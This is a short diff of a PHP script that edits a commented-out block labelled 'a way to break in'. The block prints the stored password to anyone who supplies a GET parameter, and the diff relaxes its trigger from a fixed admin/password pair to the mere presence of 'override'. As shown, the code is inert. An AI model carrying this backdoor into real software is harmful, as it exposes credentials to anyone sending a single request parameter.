@@ -81,7 +81,7 @@ if(isset($_POST['submit'])) {
                     }
 
                     /* a way to break in
-                    if((isset($_GET['admin']) && $_GET['admin'] == 'root') && (isset($_GET['password']) && $_GET['password'] == 'admin')) {
+                    if( (isset($_GET['override'])) ) {
                         nicedie("Password: $password <br>", 'System Administrator - Emergency Override');
                     } */
 
